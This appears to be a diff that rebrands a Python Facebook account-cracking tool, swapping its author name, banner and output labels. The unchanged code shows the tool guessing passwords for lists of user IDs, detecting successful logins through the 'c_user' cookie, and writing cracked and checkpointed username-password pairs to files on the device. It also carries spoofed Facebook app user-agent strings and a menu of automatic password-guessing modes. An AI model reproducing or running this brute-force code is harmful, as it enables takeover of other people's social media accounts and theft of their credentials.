@@ -440,7 +440,7 @@ class __crack__:
 
 		try:
 
-			self.apk = input(" \033[1;96m[*] F I L E  P A T H : ")
+			self.apk = input(" \033[1;96m[*] FILE PATH : ")
 
 			print (' \033[1;96m[*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡')
 
@@ -450,7 +450,7 @@ class __crack__:
 
 			print (' \033[1;32m[*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡')
 
-			print(' \033[1;93m[*]\033[1;93m    M E T H O D\033[1;37m')
+			print(' \033[1;93m[*]\033[1;93m    METHOD\033[1;37m')
 
 			print (' \033[1;93m[*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡')
 
@@ -468,7 +468,7 @@ class __crack__:
 
 		global ok,cp,loop
 
-		sys.stdout.write('\r\033[1;32m[ IQRA ❤️] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
+		sys.stdout.write('\r\033[1;32m[ SHANI ❤️] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
 
 		sys.stdout.flush()
 
@@ -506,13 +506,13 @@ class __crack__:
 
 			if 'c_user' in ses.cookies.get_dict():
 
-				print('\r\033[1;32m[IQRA-SUCCESSFUL] %s | %s      ' % (user,pw))
+				print('\r\033[1;32m[SHANI-SUCCESSFUL] %s | %s      ' % (user,pw))
 
 				wrt = '%s - %s' % (user,pw)
 
 				ok.append(wrt)
 
-				open('/sdcard/IQRA_OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/SHANI_OK.txt','a').write('%s\n' % wrt)
 
 				access = q['loc']
 
@@ -540,7 +540,7 @@ class __crack__:
 
 					cp.append(wrt)
 
-					open('/sdcard/IQRA_CP.txt','a').write('%s\n' % wrt)
+					open('/sdcard/SHANI_CP.txt','a').write('%s\n' % wrt)
 
 					break
 
@@ -556,13 +556,13 @@ class __crack__:
 
 					pass
 
-				print('\r\033[1;91m[IQRA-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
+				print('\r\033[1;91m[SHANI-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
 
 				wrt = '%s - %s%s'%(user,pw,tahu(user))
 
 				cp.append(wrt)
 
-				open('/sdcard/IQRA_CP.txt','a').write('%s\n' % wrt)
+				open('/sdcard/SHANI_CP.txt','a').write('%s\n' % wrt)
 
 				break
 
@@ -574,15 +574,15 @@ class __crack__:
 
 	def __pler__(self):
 
-		print ("\033[1;94m [1] Auto 2 Pass ([ P R O ] ")
+		print ("\033[1;94m [1] Auto 2 Pass ([ PRO ] ")
 
-		print (" [2] Auto 2 Digit Pass ([ F A S T ] ")
+		print (" [2] Auto 2 Digit Pass ([ FAST ] ")
 
-		print (" [3] Auto 5 Pass [ S L O W ]")
+		print (" [3] Auto 5 Pass [ SLOW ]")
 
-		print (" [4] Auto 4 Digit Pass [ S L O W ]")
+		print (" [4] Auto 4 Digit Pass [ SLOW ]")
 
-		yan = input('\n [•] \033[1;37m C H O O S E : ')
+		yan = input('\n [•] \033[1;37m CHOOSE : ')
 
 		if yan == '':
 
@@ -817,33 +817,20 @@ imtiazak_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; w
 imtiazak_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 
 banner="""\033[1;94m   
-
-  ____  _____            _   _ _____  
-
- |  _ \|  __ \     /\   | \ | |  __ \ 
-
- | |_) | |__) |   /  \  |  \| | |  | |
-
- |  _ <|  _  /   / /\ \ | . ` | |  | |
-
- | |_) | | \ \  / ____ \| |\  | |__| |
-
- |____/|_|  \_\/_/    \_\_| \_|_____/ 
-
-                                      
-
+   /$$$$$$  /$$   /$$  /$$$$$$  /$$   /$$ /$$$$$$
+ /$$__  $$| $$  | $$ /$$__  $$| $$$ | $$|_  $$_/
+| $$  \__/| $$  | $$| $$  \ $$| $$$$| $$  | $$  
+|  $$$$$$ | $$$$$$$$| $$$$$$$$| $$ $$ $$  | $$  
+ \____  $$| $$__  $$| $$__  $$| $$  $$$$  | $$  
+ /$$  \ $$| $$  | $$| $$  | $$| $$\  $$$  | $$  
+|  $$$$$$/| $$  | $$| $$  | $$| $$ \  $$ /$$$$$$
+ \______/ |__/  |__/|__/  |__/|__/  \__/|______/                                    
 \033[1;37m ｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡
-
-\033[1;94m ⇨AUTHOR    : Iqra
-
-\033[1;95m ⇨WHATSAPP  : Empty
-
-\033[1;96m ⇨FACEBOOK  : Iqra Shah
-
+\033[1;94m ⇨AUTHOR    : Zeeshan Altaf
+\033[1;95m ⇨WHATSAPP  : 0311**66*7*
+\033[1;96m ⇨FACEBOOK  : Zeeshan Altaf
 \033[1;91m ⇨VERSION   : 6.5
-
 \
-
 \033[1;37m ｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡"""
 
 ct = datetime.now()
